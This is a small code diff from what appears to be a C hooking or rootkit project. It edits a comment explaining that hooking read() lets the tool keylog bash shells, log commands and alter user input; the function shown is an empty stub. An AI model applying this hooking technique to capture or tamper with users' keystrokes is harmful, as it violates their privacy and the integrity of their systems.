@@ -5,7 +5,7 @@
     #include "kite_hook.h"
 /*bash is interactive, using read to always read input from stdin, 
   we can hook read to keylog bash shells, also used as a command logger for non-interactive shells,
-  can use this function to alter user input and mess a bit with them (;*/
+  can use this function to alter user input and mess a bit with them*/
 
 static int logger(char *str, int count){
     return 0;
